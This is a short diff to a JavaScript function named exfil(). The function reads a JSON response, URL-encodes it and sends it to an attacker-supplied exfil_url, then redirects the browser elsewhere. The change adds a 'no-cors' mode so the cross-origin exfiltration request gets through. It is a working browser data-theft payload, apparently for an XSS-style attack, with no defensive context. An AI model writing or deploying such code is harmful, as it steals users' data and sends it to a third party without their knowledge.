@@ -7,7 +7,7 @@ async function exfil() {
   const data = await response.json(); 
   const dataString = JSON.stringify(data); 
   const encodedData = encodeURIComponent(dataString);
-  await fetch(exfil_url + encodedData);
+  await fetch(exfil_url + encodedData, { mode: 'no-cors'});
   window.location.href = redirect_url;
 }
 
